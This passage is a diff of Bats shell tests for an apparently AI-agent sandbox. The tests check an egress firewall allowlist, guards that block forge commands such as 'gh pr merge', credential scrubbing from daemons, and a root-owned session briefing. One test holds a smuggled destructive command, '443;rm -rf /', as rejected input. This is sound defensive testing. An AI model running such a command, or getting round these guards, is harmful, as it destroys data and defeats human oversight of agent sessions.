+# means the file was read and the pattern was not in it.
+@test "every absence assertion distinguishes absent from unreadable" {
+    run awk '
+        /^[[:space:]]*run grep/ { pending = NR; next }
+        pending && /\$status" -ne 0/ { print FILENAME ":" NR; bad = 1 }
+        { pending = 0 }
+        END { exit bad }
+    ' "$BATS_TEST_FILENAME"
+    [ "$status" -eq 0 ] || {
+        echo "these assert -ne 0 after a run grep, so a missing file passes:"
+        echo "$output"
+        return 1
+    }
+}
+
+# cidr-collapse is the only validation between a forge's published ranges
+# document and the live allowlist: egress-policy pipes the fetched ranges and
+# the operator's own forge addresses through it, and loads whatever comes back.
+# Both halves of that matter - the collapse keeps the interval sets small, and
+# the validation is the only thing that looks at what the document contained.
+_collapse() { run "$SANDBOX_DIR/cidr-collapse" "$@"; }
+
+@test "cidr-collapse merges adjacent and nested ranges into the smallest list" {
+    _collapse 192.0.2.0/25 192.0.2.128/25
+    [ "$status" -eq 0 ]
+    [ "$output" = "192.0.2.0/24" ]
+
+    # A range already inside another contributes nothing.
+    _collapse 192.0.2.0/24 192.0.2.64/26
+    [ "$status" -eq 0 ]
+    [ "$output" = "192.0.2.0/24" ]
+
+    # Not adjacent, so both survive - the collapse must not over-merge, or the
+    # allowlist would grow to cover addresses the forge never published.
+    _collapse 192.0.2.0/25 198.51.100.0/25
+    [ "$status" -eq 0 ]
+    [ "$output" = "192.0.2.0/25
+198.51.100.0/25" ]
+}
+
+@test "cidr-collapse prints v4 before v6 and collapses each family alone" {
+    _collapse 2001:db8::/33 192.0.2.0/24 2001:db8:8000::/33
+    [ "$status" -eq 0 ]
+    [ "$output" = "192.0.2.0/24
+2001:db8::/32" ]
+}
+
+@test "cidr-collapse reads stdin when given no arguments" {
+    run bash -c "printf '192.0.2.0/25, 192.0.2.128/25\n' | '$SANDBOX_DIR/cidr-collapse'"
+    [ "$status" -eq 0 ]
+    [ "$output" = "192.0.2.0/24" ]
+
+    # Whitespace and commas both separate, because the forge filter and
+    # entries_of produce different shapes into the same pipe.
+    run bash -c "printf '192.0.2.0/25\n192.0.2.128/25 198.51.100.1\n' | '$SANDBOX_DIR/cidr-collapse'"
+    [ "$status" -eq 0 ]
+    [ "$output" = "192.0.2.0/24
+198.51.100.1/32" ]
+}
+
+@test "cidr-collapse refuses a malformed range rather than dropping it" {
+    # The whole point: a bad entry from an upstream document has to stop the
+    # caller. Silently skipping it would load a short allowlist and look fine.
+    for bad in 192.0.2.0/33 192.0.2.300/24 'not-an-address' '192.0.2.0-192.0.2.5'; do
+        _collapse 192.0.2.0/25 "$bad"
+        [ "$status" -ne 0 ] || { echo "accepted '$bad'"; return 1; }
+        [[ "$output" == *"cidr-collapse:"* ]] || { echo "'$bad': $output"; return 1; }
+        # And prints nothing usable on stdout, so a caller substituting the
+        # output cannot end up with a partial list.
+        [[ "$output" != *"192.0.2.0/25"* ]] || { echo "'$bad' leaked a range"; return 1; }
+    done
+}
+
+@test "cidr-collapse accepts a bare address and a host-bits range" {
+    # entries_of forge addr yields bare addresses, and a published document may
+    # carry host bits; strict=False is what lets both through the same pipe.
+    _collapse 192.0.2.5 192.0.2.1/24
+    [ "$status" -eq 0 ]
+    [ "$output" = "192.0.2.0/24" ]
+}
+
+@test "cidr-collapse on empty input exits clean and prints nothing" {
+    # egress-policy checks for an empty forge list itself and dies with a
+    # message naming the forge; this filter must not be the thing that fails,
+    # or that message is never reached.
+    run bash -c "printf '' | '$SANDBOX_DIR/cidr-collapse'"
+    [ "$status" -eq 0 ]
+    [ -z "$output" ]
+}
+
+# The host entry is the only destination in the policy nobody declared: it is
+# the gateway of the default route, and Docker publishes container ports there.
+# Driven for real rather than grepped, because what matters is the rule text nft
+# is handed - see runtime.bats for the same property enforced end to end.
+_host_clamp() {  # _host_clamp <EGRESS_HOST_PORTS value>
+    run env EGRESS_HOST_PORTS="$1" bash -c '
+        set -Eeuo pipefail
+        HOST_PORTS=${EGRESS_HOST_PORTS:-}
+        die() { printf "FAILED: %s\n" "$*" >&2; exit 1; }
+        eval "$(sed -n "/^emit_host_clamp()/,/^}/p;/^validate_host_ports()/,/^}/p" "'"$SANDBOX_DIR"'/egress-policy")"
+        validate_host_ports
+        emit_host_clamp host_v4'
+}
+
+@test "the host entry opens no port unless it was told one" {
+    _host_clamp ""
+    [ "$status" -eq 0 ]
+    # One rule, and it is the refusal. A permit here would be the unclamped
+    # grant over every port the host publishes.
+    [ "$(grep -c . <<< "$output")" -eq 1 ]
+    [[ "$output" == *"ip daddr @host_v4 goto refuse"* ]]
+    [[ "$output" != *permit* ]]
+}
+
+@test "the host entry's clamp is matched before the rules that would widen it" {
+    # The clamp said the right thing and never saw the packets. The open
+    # class permits on every port, and the host's own address lands in it by
+    # several ordinary routes - a host-resident LOKI_URL, a self-served
+    # model's base_url, `dejima-allow <gateway>` - so the permit answered
+    # first and the host was open on every port, sshd and the remote-access
+    # front door included.
+    #
+    # Asserted on the order the emitters are called in, which is what decides
+    # it: nft takes the first match.
+    local policy="$SANDBOX_DIR/egress-policy" host_at open_at forge_at
+    host_at="$(grep -n '^    emit_host_clamp host_v4' "$policy" | cut -d: -f1)"
+    open_at="$(grep -n 'ip daddr @literal_v4 goto permit' "$policy" | cut -d: -f1)"
+    forge_at="$(grep -n '^    emit_forge_clamp ip forge_v4' "$policy" | cut -d: -f1)"
+    [ -n "$host_at" ] && [ -n "$open_at" ] && [ -n "$forge_at" ] \
+        || { echo "the rule emitters could not be found"; return 1; }
+    [ "$host_at" -lt "$open_at" ] \
+        || { echo "the open class permits the host's address before the clamp sees it"
+             return 1; }
+    # And still after the forge clamp, so a host-resident forge is read as a
+    # forge rather than as the host.
+    [ "$forge_at" -lt "$host_at" ] \
+        || { echo "the host clamp now answers for a host-resident forge"; return 1; }
+}
+
+@test "the launcher offers host candidates and the filter decides which are the host" {
+    # Split across the two processes because neither knows both halves. The
+    # launcher knows which destinations this launch configured and cannot know
+    # the host's address; the filter works that out from the default route.
+    #
+    # Comparing in the launcher against EGRESS_HOST_ADDR looked equivalent and
+    # was not: that variable is the operator's override for a wrong
+    # derivation, so it is normally unset, and nothing was ever derived - a
+    # host-resident Loki at the gateway address stopped being reachable the
+    # moment the clamp went first.
+    local src="$REPO_ROOT/bin/dejima" flat
+    flat="$(sed -z 's/\\\n[[:space:]]*/ /g' "$src")"
+    grep -qF '_egress_host_candidate' <<< "$flat" \
+        || { echo "nothing offers a host candidate"; return 1; }
+    grep -qF -- '-e EGRESS_HOST_CANDIDATES' <<< "$flat" \
+        || { echo "the candidates are not passed to the filter container"; return 1; }
+
+    # The launcher's half: a literal address with an explicit port, or
+    # nothing. A wrong answer is either a port nobody opened on the host or a
+    # service nobody can reach.
+    _cand() {
+        run bash -c '
+            eval "$(sed -n "/^_egress_host_candidate()/,/^}/p" "'"$REPO_ROOT"'/bin/dejima")"
+            printf "[%s]" "$(_egress_host_candidate "$1")"' _ "$1"
+    }
+    _cand "http://172.17.0.1:3100"
+    [ "$output" = "[172.17.0.1:3100]" ] || { echo "the gateway candidate was not offered: $output"; return 1; }
+    # Userinfo and a query do not become part of it: a password starting with
+    # a digit, and a query with no path, each read as the port.
+    _cand "http://u:9secret@172.17.0.1:3100/v1"
+    [ "$output" = "[172.17.0.1:3100]" ] || { echo "userinfo reached the port: $output"; return 1; }
+    _cand "http://172.17.0.1:3100?x=1"
+    [ "$output" = "[172.17.0.1:3100]" ] || { echo "a query reached the port: $output"; return 1; }
+
+    local url
+    while IFS= read -r url; do
+        [ -n "$url" ] || continue
+        _cand "$url"
+        [ "$output" = "[]" ] || { echo "offered $output for $url"; return 1; }
+    done <<CASES
+https://loki.example.com/loki/api/v1/push
+https://172.17.0.1/x
+http://loki.internal:3100
+http://172.17.0.1
+http://[fe80::1]/
+http://[fe80::1]:3100/
+CASES
+
+    # The filter's half: a candidate's port is kept only if its address is one
+    # the host was discovered at.
+    _fold() {  # _fold <HOST_PORTS> <HOST_CANDIDATES> <addr>...
+        local ports="$1" cands="$2"; shift 2
+        run env HOST_PORTS_IN="$ports" HOST_CANDIDATES_IN="$cands" bash -c '
+            set -Eeuo pipefail
+            HOST_PORTS=$HOST_PORTS_IN
+            HOST_CANDIDATES=$HOST_CANDIDATES_IN
+            die() { printf "FAILED: %s\n" "$*" >&2; exit 1; }
+            eval "$(sed -n "/^fold_host_candidates()/,/^}/p" "'"$SANDBOX_DIR"'/egress-policy")"
+            fold_host_candidates "$@"
+            printf "[%s]" "$HOST_PORTS"' _ "$@"
+    }
+    _fold "" "172.17.0.1:3100" 172.17.0.1
+    [ "$output" = "[3100]" ] || { echo "the host's own candidate was dropped: $output"; return 1; }
+    _fold "" "172.17.0.1:3100" 192.168.9.9
+    [ "$output" = "[]" ] || { echo "a candidate that is not the host was kept: $output"; return 1; }
+    # The operator's own value is extended, not replaced, and a repeat does
+    # not double.
+    _fold "22000" "172.17.0.1:3100 10.0.0.5:8080" 172.17.0.1 10.0.0.5
+    [ "$output" = "[22000,3100,8080]" ] || { echo "the combined list came out as $output"; return 1; }
+    _fold "3100" "172.17.0.1:3100" 172.17.0.1
+    [ "$output" = "[3100]" ] || { echo "a port already present was added again: $output"; return 1; }
+    # `any` is wider than anything a candidate could add.
+    _fold "any" "172.17.0.1:3100" 172.17.0.1
+    [ "$output" = "[any]" ] || { echo "any was narrowed to $output"; return 1; }
+    # And nothing at all when the host has no entry.
+    _fold "" "172.17.0.1:3100"
+    [ "$output" = "[]" ] || { echo "a candidate was kept with no host address: $output"; return 1; }
+    return 0
+}
+
+@test "the host entry permits the ports it was given, and refuses the rest" {
+    _host_clamp "3100"
+    [ "$status" -eq 0 ]
+    [[ "$output" == *"ip daddr @host_v4 tcp dport { 3100 } goto permit"* ]]
+    # The refusal has to sit immediately after the permission, for the same
+    # reason the forge clamp's does: it is what makes the narrow rule win when
+    # the address is also matched by something wider.
+    [ "$(sed -n '$=' <<< "$output")" -eq 2 ]
+    [[ "$(tail -1 <<< "$output")" == *"goto refuse"* ]]
+
+    # Commas, spaces and both, and a low-high range: each becomes one element,
+    # never an empty one, which nft rejects outright.
+    _host_clamp "22,443"
+    [[ "$output" == *"{ 22, 443 }"* ]]
+    _host_clamp "22 443"
+    [[ "$output" == *"{ 22, 443 }"* ]]
+    _host_clamp "3100, 8443 9090-9095"
+    [[ "$output" == *"{ 3100, 8443, 9090-9095 }"* ]]
+}
+
+@test "EGRESS_HOST_PORTS=any restores the unclamped rule, and says so in the ruleset" {
+    _host_clamp any
+    [ "$status" -eq 0 ]
+    [ "$(grep -c . <<< "$output")" -eq 1 ]
+    [[ "$output" == *"ip daddr @host_v4 goto permit"* ]]
+    [[ "$output" != *refuse* ]]
+}
+
+@test "a port that is not a port stops the container rather than becoming a rule" {
+    # Same reasoning as classify_entry's: a destination that looks configured
+    # and is silently refused is the worst of the three outcomes.
+    for bad in 0 70000 99-11 ssh '443;rm -rf /' '-1' '443/tcp'; do
+        _host_clamp "$bad"
+        [ "$status" -ne 0 ] || { echo "accepted '$bad': $output"; return 1; }
+        [[ "$output" == *"EGRESS_HOST_PORTS"* ]] || { echo "'$bad': $output"; return 1; }
+        [[ "$output" != *"goto permit"* ]] || { echo "'$bad' emitted a rule"; return 1; }
+    done
+}
+
+@test "the filter container is given the two variables the host entry reads" {
+    # egress-policy defaults both, and neither has a config key, so the only
+    # way an operator can set them is through the launcher's own run line.
+    # Without this the clamp above would have no escape hatch they could reach.
+    for v in EGRESS_HOST_ADDR EGRESS_HOST_PORTS; do
+        run grep -F -- "-e $v" "$REPO_ROOT/bin/dejima"
+        [ "$status" -eq 0 ] \
+            || { echo "bin/dejima does not pass $v to the filter container"; return 1; }
+    done
+}
+
+# The policy library is what makes a bypass fixable once instead of twice, so
+# the two things that could quietly undo that are pinned: the image has to
+# carry it, and nothing may reintroduce a second copy of a rule.
+@test "the shared guard policy is installed in the image and sourced by all four layers" {
+    # setup() points every guard here at the checkout's copy, which is exactly
+    # what would hide the COPY line going missing: the suite would stay green
+    # while a container had no file to source and every guard died on startup.
+    grep -qF 'COPY docker/guard-lib.sh /usr/local/lib/dejima/guard-lib.sh' \
+        "$SANDBOX_DIR/Dockerfile" \
+        || { echo "the image does not carry the shared guard policy"; return 1; }
+
+    local f
+    for f in "$SANDBOX_DIR/git-guard.sh" "$SANDBOX_DIR/forge-guard.sh" \
+             "$REPO_ROOT/hooks/git-push-guard.sh" "$REPO_ROOT/hooks/merge-guard.sh" \
+             "$SANDBOX_DIR/entrypoint.sh"; do
+        grep -q 'DEJIMA_GUARD_LIB:-/usr/local/lib/dejima/guard-lib.sh' "$f" \
+            || { echo "$f does not source the shared policy"; return 1; }
+    done
+
+    # And the decision is in one place: the host and branch checks belong to
+    # the library, so a caller carrying either again is the drift this exists
+    # to prevent.
+    # Comments excluded: both files document the contract by naming these, and
+    # that prose is the reason an operator can read either one on its own. What
+    # must not come back is CODE reading them.
+    local code v
+    for f in "$SANDBOX_DIR/git-guard.sh" "$REPO_ROOT/hooks/git-push-guard.sh"; do
+        code="$(grep -v '^[[:space:]]*#' "$f")"
+        for v in DEJIMA_PUSH_HOSTS DEJIMA_BLOCKED_BRANCHES; do
+            grep -q "$v" <<< "$code" \
+                && { echo "$f reads $v again instead of asking the library"; return 1; }
+        done
+    done
+    # Named in the library once each, where the fail directions are documented
+    # together - closed for hosts, open for branches.
+    grep -q 'DEJIMA_PUSH_HOSTS' "$SANDBOX_DIR/guard-lib.sh" \
+        || { echo "the library does not check the allowed hosts"; return 1; }
+}
+
+@test "the forge guards agree on the same commands" {
+    # The other half of #365's duplication: the hook regex-matched a command
+    # string while the shadow compared argv, so the two could not be reasoned
+    # about together. They now call the same function, and the hook applies
+    # every rule the shadow does rather than the merge block alone.
+    local d; d="$(mktemp -d "$BATS_TEST_TMPDIR/forgedrift.XXXXXX")"
+    _repo_guard_shim "$d"
+    local env_common=(DEJIMA=1 DEJIMA_FORGE_REAL_DIR="$d/real"
+                      DEJIMA_FORGE_REPO=own/thing
+                      DEJIMA_MERGE_BLOCK="gh pr merge"
+                      DEJIMA_FORGE_REPO_FLAGS="--repo -R" DEJIMA_FORGE_REPO_ENV=GH_REPO
+                      DEJIMA_FORGE_REPO_PATHS="api:repos")
+    local cmd hook_out shadow_out hook_blocked shadow_blocked payload refused=0
+    for cmd in "gh pr merge 3" "gh pr view 3" "gh issue create --title x" \
+               "gh --repo other/thing issue create --title x" \
+               "gh api repos/other/thing/issues" \
+               "gh api repos/own/thing/issues" \
+               "gh api user/repos" \
+               "gh api graphql -f query=mutation{mergePullRequest}" \
+               "/usr/local/bin/gh pr merge 3" \
+               "echo gh pr merge 3"; do
+        payload=$(jq -n --arg c "$cmd" '{tool_input: {command: $c}}')
+        hook_out="$(printf '%s' "$payload" \
+            | env "${env_common[@]}" bash "$REPO_ROOT/hooks/merge-guard.sh" 2>&1 || true)"
+        # The shadow is only ever reached as the command itself, so a
+        # path-qualified or embedded spelling is the same argv to it.
+        # shellcheck disable=SC2086
+        set -- ${cmd#*gh }
+        shadow_out="$(env "${env_common[@]}" "$d/gh" "$@" 2>&1 || true)"
+        hook_blocked=0; shadow_blocked=0
+        [[ "$hook_out" == *"Blocked by"* ]] && hook_blocked=1
+        [[ "$shadow_out" == *"Blocked by dejima"* ]] && shadow_blocked=1
+        # `echo gh pr merge 3` is the one case where they must differ: the hook
+        # sees a segment whose first word is echo and leaves it alone, and the
+        # shadow was handed the argv directly so there is no echo in it.
+        if [ "$cmd" = "echo gh pr merge 3" ]; then
+            [ "$hook_blocked" -eq 0 ] \
+                || { echo "the hook blocked a command that merely names gh"; return 1; }
+            continue
+        fi
+        [ "$hook_blocked" -eq "$shadow_blocked" ] || {
+            echo "disagreement on '$cmd': hook=$hook_blocked shadow=$shadow_blocked" >&2
+            echo "  hook:   $hook_out" >&2
+            echo "  shadow: $shadow_out" >&2
+            return 1
+        }
+        [ "$hook_blocked" -eq 1 ] && refused=$((refused + 1))
+    done
+    # Agreement on allowing everything would satisfy the loop above.
+    [ "$refused" -ge 4 ] || { echo "only $refused of those were refused"; return 1; }
+}
+
+@test "a forge that can be aimed elsewhere names the CLI the guard is linked over" {
+    # The repository rules are applied to the commands in merge_block and
+    # disclose, because those are the only two keys that name a CLI: that set
+    # is what entrypoint.sh links the shadow over and what hooks/merge-guard.sh
+    # checks a command against. So a forge declaring repo_flags, repo_env or
+    # repo_paths and neither of those would get the rule applied to nothing -
+    # silently, since there is no command for it to be absent from.
+    #
+    # Asserted over what ships rather than enforced in the manifest validator,
+    # which is where it would belong if a third-party forge ever hit it;
+    # docs/providers.md states the precondition for that reader.
+    local forge aimable named
+    for forge in $(lib provider_list forge); do
+        aimable=""
+        for key in repo_flags repo_env repo_paths; do
+            [ -n "$(lib manifest_get forge "$forge" "$key")" ] && aimable=1
+        done
+        [ -n "$aimable" ] || continue
+        named="$(lib manifest_get forge "$forge" merge_block)$(lib manifest_get forge "$forge" disclose)"
+        [ -n "$named" ] \
+            || { echo "forge $forge can be aimed elsewhere, and names no CLI for the guard to be linked over"; return 1; }
+    done
+}
+
+# permit_address puts a forge-class address in two sets, and the second add
+# failing used to leave the first standing: the address the forge class says is
+# HTTPS-only stayed in literal_v4, which permits every port, while the entries
+# file rolled back so nothing reported it. Driven with a stub nft, because the
+# real one needs a namespace to act on.
+_permit_address() {  # _permit_address <class> <which add fails: ""|forge_v4>
+    run env FAIL_SET="$2" bash -c '
+        set -u
+        TABLE=t
+        ENTRIES_FILE="$BATS_TEST_TMPDIR/entries"
+        : > "$ENTRIES_FILE"
+        printf "before\n" > "$ENTRIES_FILE.prev"
+        say() { printf "say: %s\n" "$*"; }
+        die() { printf "die: %s\n" "$*"; exit 1; }
+        nft() {
+            printf "nft: %s\n" "$*"
+            case "$*" in
+                *"add element"*" ${FAIL_SET:-__none__} "*) return 1 ;;
+            esac
+            return 0
+        }
+        eval "$(sed -n "/^permit_address()/,/^}/p" "'"$SANDBOX_DIR"'/egress-policy")"
+        permit_address "$1" 198.51.100.7
+    ' _ "$1"
+}
+
+@test "a forge-class permit that half-lands takes back the any-port element" {
+    _permit_address forge forge_v4
+    [ "$status" -ne 0 ] || { echo "the failure was not reported: $output"; return 1; }
+    [[ "$output" == *"could not add 198.51.100.7 to the forge class"* ]] \
+        || { echo "$output"; return 1; }
+    # The point of the fix: the any-port element is removed again, so the
+    # address is not left permitted on every port by a command that refused.
+    [[ "$output" == *"nft: delete element inet t literal_v4 { 198.51.100.7 }"* ]] \
+        || { echo "the any-port element was left behind: $output"; return 1; }
+
+    # The whole add still succeeding touches neither rollback.
+    _permit_address forge ""
+    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
+    [[ "$output" != *"delete element"* ]] || { echo "rolled back a success: $output"; return 1; }
+    [[ "$output" == *"198.51.100.7 permitted (forge class, direct)"* ]] || { echo "$output"; return 1; }
+
+    # An open-class permit never touches forge_v4, so there is nothing to undo
+    # and the first add failing is reported on its own terms.
+    _permit_address open literal_v4
+    [ "$status" -ne 0 ]
+    [[ "$output" == *"could not add 198.51.100.7 to the allow-list"* ]] || { echo "$output"; return 1; }
+    [[ "$output" != *"delete element"* ]] || { echo "undid an add that never landed: $output"; return 1; }
+}
+
+@test "nothing capability-dropped is started through env" {
+    # drop_caps is a shell function (caps-lib.sh), so `env` in front of it
+    # cannot find anything to exec: the line becomes exit 127. Every caller
+    # backgrounds or execs it, so that status is either hidden by `&` or is the
+    # whole process - which is how a prefix added for one reason took the log
+    # shipper out without a word.
+    # Continuations flattened first, because the prefix that broke it was
+    # written across two lines - a per-line grep did not see it, which is the
+    # same reason launch.bats flattens before matching. Comments dropped after
+    # that, or the line explaining why the prefix is absent is itself a match.
+    local f line bad=""
+    for f in "$SANDBOX_DIR"/*.sh; do
+        while IFS= read -r line; do
+            bad="$bad
+$(basename "$f"): $line"
+        done < <(sed -z 's/\\\n[[:space:]]*/ /g' "$f" \
+                 | grep -vE '^[[:space:]]*#' \
+                 | grep -nE '\benv\b[^;&|]*\b(drop_caps|require_setpcap)\b')
+    done
+    [ -z "$bad" ] \
+        || { echo "env cannot exec a shell function, so these are exit 127:$bad"; return 1; }
+}
+
+@test "no daemon the policy starts inherits the forge credential" {
+    # The resolver, the two log readers and the shipper all parse content the
+    # session's own traffic decides. The published-ranges fetch is the only
+    # thing in the firewall path that needs GH_TOKEN or the header derived from
+    # it, and these are reachable without ever passing through that fetch:
+    # `dejima-allow` runs `egress-policy permit` through `docker exec`, which
+    # gets the filter container's configured environment, and both permit_name
+    # and rollback_entries restart the resolver. So an unset upstream of one
+    # call path says nothing about the others.
+    #
+    # Asserted at the start lines themselves rather than by line order, which
+    # is what makes it independent of how a daemon was reached.
+    local f="$SANDBOX_DIR/egress-policy" line
+    while IFS= read -r line; do
+        [[ "$line" == *'NO_CREDENTIAL[@]'* ]] \
+            || { echo "a daemon starts with the credential still in reach: $line"; return 1; }
+    done < <(grep -nE '^\s*(nohup )?("\$\{NO_CREDENTIAL\[@\]\}" )?(dnsmasq|ulogd|gosu "\$LOGGER_USER") ' "$f")
+
+    # Three of them, so a daemon dropped from the sweep is not a daemon that
+    # passed it.
+    [ "$(grep -cE '^\s*(nohup )?"\$\{NO_CREDENTIAL\[@\]\}" ' "$f")" -eq 3 ] \
+        || { echo "expected three scrubbed daemon starts in $f"; return 1; }
+
+    # And both names are what it removes. The header carries the token in
+    # another wrapper, so dropping either from the list leaves a credential
+    # behind.
+    grep -q 'NO_CREDENTIAL=(env -u GH_TOKEN -u EGRESS_FORGE_META_AUTH)' "$f" \
+        || { echo "the scrub no longer names both halves of the credential"; return 1; }
+
+    # The shipper is started by firewall-up.sh rather than by the policy, so
+    # NO_CREDENTIAL does not reach it. What covers it is ORDER: both names are
+    # gone from this script's environment before the line that starts it. That
+    # is asserted rather than a scrub on the line itself, because drop_caps is a
+    # shell function and `env` can only exec a binary - a prefix there is exit
+    # 127, which the `&` hides from set -e, and a shipper that never starts
+    # takes Loki logging with it silently.
+    local up="$SANDBOX_DIR/firewall-up.sh" drop_token drop_hdr apply_at ship_at
+    drop_token="$(grep -n '^unset GH_TOKEN$' "$up" | cut -d: -f1)"
+    drop_hdr="$(grep -n '^unset EGRESS_FORGE_META_AUTH$' "$up" | cut -d: -f1)"
+    apply_at="$(grep -n 'egress-policy apply' "$up" | head -1 | cut -d: -f1)"
+    ship_at="$(grep -n 'log-shipper.sh &' "$up" | head -1 | cut -d: -f1)"
+    [ -n "$drop_token" ] && [ -n "$drop_hdr" ] && [ -n "$apply_at" ] && [ -n "$ship_at" ] \
+        || { echo "firewall-up.sh no longer drops both names around the policy run"; return 1; }
+    [ "$drop_token" -lt "$apply_at" ] \
+        || { echo "the raw token outlives the policy run"; return 1; }
+    [ "$drop_hdr" -gt "$apply_at" ] \
+        || { echo "the header dies before the request that uses it"; return 1; }
+    [ "$drop_hdr" -lt "$ship_at" ] \
+        || { echo "the shipper starts while the header is still in the environment"; return 1; }
+
+    # The header is still there for the fetch that needs it, so the scrub
+    # cannot pass by breaking the request.
+    local fetch unset_at
+    fetch="$(grep -n 'fetch_forge_ranges "\$meta"' "$f" | head -1 | cut -d: -f1)"
+    unset_at="$(grep -n '^  unset FORGE_META_AUTH EGRESS_FORGE_META_AUTH$' "$f" | cut -d: -f1)"
+    [ -n "$fetch" ] && [ -n "$unset_at" ] || { echo "the fetch or the unset is gone"; return 1; }
+    [ "$fetch" -lt "$unset_at" ] \
+        || { echo "the header is scrubbed before the request that uses it"; return 1; }
+}
+
+@test "the briefing renderer runs as the session user, not as root" {
+    # It reads the project's own .dejima.md and asks the package managers what
+    # is installed, with its cwd inside the workspace a session can write.
+    # Nothing about that needs root - and running as root got the answer wrong
+    # as well: the dependency layers install npm and cargo packages as the
+    # sandbox user, into that user's HOME, so root's cargo home has none of
+    # them and every declared cargo dependency was reported missing.
+    #
+    # hooks/sandbox-context.sh already reaches it as that user, since a hook
+    # runs inside the session. This is the other route agreeing with it.
+    local e="$SANDBOX_DIR/entrypoint.sh" line
+    line="$(grep -n 'dejima-briefing-render.sh' "$e" | head -1)"
+    [ -n "$line" ] || { echo "entrypoint.sh no longer renders the briefing"; return 1; }
+    [[ "$line" == *'gosu "$SANDBOX_USER"'* ]] \
+        || { echo "the renderer still runs as root: $line"; return 1; }
+
+    # The file it writes stays root-owned and read-only, which is the half that
+    # must NOT be deprivileged: a session that could write this would be
+    # writing its own next briefing.
+    grep -q 'chown root:root "$DEJIMA_BRIEFING_RENDERED.part"' "$e" \
+        || { echo "the rendered briefing is no longer root-owned"; return 1; }
+    grep -q 'chmod 444 "$DEJIMA_BRIEFING_RENDERED.part"' "$e" \
+        || { echo "the rendered briefing is no longer read-only"; return 1; }
+}
+
+@test "the pty chown tests the descriptor tty(1) reports on" {
+    # `tty` reads stdin; testing stdout instead meant a container with one
+    # attached and the other not produced an empty path and a chown that
+    # silently did nothing - which is the nvim clipboard fallback failing with
+    # nothing to point at.
+    local block
+    block="$(grep -B2 -A2 'chown "$SANDBOX_USER" "$(tty)"' "$SANDBOX_DIR/entrypoint.sh")"
+    [ -n "$block" ] || { echo "the pty chown is gone"; return 1; }
+    grep -q '\[ -t 0 \]' <<< "$block" \
+        || { echo "the guard tests a descriptor other than the one tty reads: $block"; return 1; }
+}
+
+@test "every workflow run: block parses under the shell the runner gives it" {
+    # The runner's default is `sh -e`, which the step log states and nothing in
+    # the workflow overrides. A bash array in a run: block is therefore a syntax
+    # error that kills the step before any of it executes - and it reaches CI
+    # from here looking fine, because nothing local runs the workflow and a YAML
+    # parse says only that the string is a string.
+    #
+    # Swept with `sh -n` over the whole file rather than the one step that got
+    # it wrong, and against dash where it is available, since that is what
+    # Debian's /bin/sh is on these runners.
+    local sh_bin=sh
+    command -v dash >/dev/null 2>&1 && sh_bin=dash
+
+    local found
+    found=$(python3 - "$REPO_ROOT/.gitea/workflows/tests.yml" "$BATS_TEST_TMPDIR" <<'PY'
+import os, re, sys
+
+# Scanned by indentation rather than parsed with PyYAML, which is not in the
+# test image - a check needing a module the runner lacks is one that stops
+# running without failing. The only shapes to read are the two this file uses,
+# a run: key holding a block scalar or one inline command, and the count this
+# prints is what says the scan found every one of them.
+wf, out = sys.argv[1], sys.argv[2]
+raw = open(wf).read().split("\n")
+
+if any(re.match(r"^\s+defaults:", line) for line in raw):
+    sys.exit("a job sets defaults:, so a run: block may no longer get the runner's default shell")
+
+def indent(line):
+    return len(line) - len(line.lstrip())
+
+# The first key of a list item shares the line with its dash. A copy with it
+# moved onto the dash's own column puts every key of every item at one indent,
+# and is used for finding keys only - the run: bodies are taken from the file
+# as written, where a shell line that happens to start with a dash is safe.
+keyed = [re.sub(r"^(\s*)-\s(\s*\S)", r"\1  \2", line) for line in raw]
+
+found = 0
+for n, line in enumerate(raw):
+    m = re.match(r"^(\s*)-\s", line)
+    if not m:
+        continue
+    col = len(m.group(1))
+    # Where the next item or the end of the list begins, read off the file as
+    # written: in the keyed copy a sibling item's dash no longer dedents.
+    end = next((j for j in range(n + 1, len(raw))
+                if raw[j].strip() and indent(raw[j]) <= col), len(raw))
+    keys = {}
+    for j in range(n, end):
+        k = re.match(r"^ {%d}([a-z-]+):\s*(.*)$" % (col + 2), keyed[j])
+        if k:
+            keys[k.group(1)] = (j, k.group(2))
+    if "run" not in keys:
+        continue
+    found += 1
+    # A step naming its own shell is that shell's to parse, not sh's.
+    if "shell" in keys:
+        continue
+    at, value = keys["run"]
+    if value.startswith("|"):
+        body = raw[at + 1:next((j for j in range(at + 1, end)
+                                if raw[j].strip() and indent(raw[j]) <= col + 2), end)]
+        off = indent(body[0]) if body else 0
+        text = "\n".join(line[off:] for line in body)
+    else:
+        text = value
+    path = os.path.join(out, "%03d.sh" % found)
+    open(path, "w").write(text + "\n")
+    name = keys.get("name", (0, ""))[1]
+    open(path + ".name", "w").write(
+        "%s, line %d" % (name, at + 1) if name else "line %d" % (at + 1))
+print(found)
+PY
+)
+    # A hand-rolled scan that reads a shape it was not written for finds
+    # nothing and reports no failures, so what it found is checked against a
+    # plain count of the keys in the file.
+    local declared
+    declared=$(grep -cE '^[[:space:]]*(-[[:space:]]+)?run:' "$REPO_ROOT/.gitea/workflows/tests.yml")
+    [ "$found" = "$declared" ] \
+        || { echo "the workflow declares $declared run: blocks and the scan read $found of them"; return 1; }
+
+    local checked=0 bad=""
+    for f in "$BATS_TEST_TMPDIR"/*.sh; do
+        [ -e "$f" ] || continue
+        checked=$((checked + 1))
+        "$sh_bin" -n "$f" 2>"$f.err" \
+            || bad="$bad
+$(cat "$f.name"): $(head -1 "$f.err")"
+    done
+    [ -z "$bad" ] \
+        || { echo "these run: blocks are not valid $sh_bin, so the step dies before it runs:$bad"; return 1; }
+
+    # A loop over nothing passes, so the count has to be a real one. Five jobs,
+    # each with at least one run: block.
+    [ "$checked" -ge 5 ] \
+        || { echo "only $checked run: blocks were parsed, so this checked almost nothing"; return 1; }
+}
+
+@test "the resolver checks have a permitted name to use when the meta URL has no host" {
+    # The cached-ranges fixture points EGRESS_FORGE_META_URL at a file:// path
+    # (#357), and a file URL has no host - so the checks that resolve "the meta
+    # URL's host" were handed an empty string, asked the resolver to look up
+    # "", and failed every container's boot on it. The whole privileged suite
+    # went down that way.
+    #
+    # The property those checks state is about the policy: that a permitted
+    # name resolves and that its address lands in that name's own set. So the
+    # subject falls back to a permitted forge-class name, which is what the
+    # meta URL's host was an instance of.
+    local p="$SANDBOX_DIR/egress-policy"
+    _subject() {  # _subject <host> <entries-file-contents>
+        run bash -c '
+            set -uo pipefail
+            ENTRIES_FILE="$3"
+            printf "%s" "$4" > "$ENTRIES_FILE"
+            eval "$(sed -n "/^entries_of()/,/^}/p" "$1")"
+            eval "$(sed -n "/^verify_subject()/,/^}/p" "$1")"
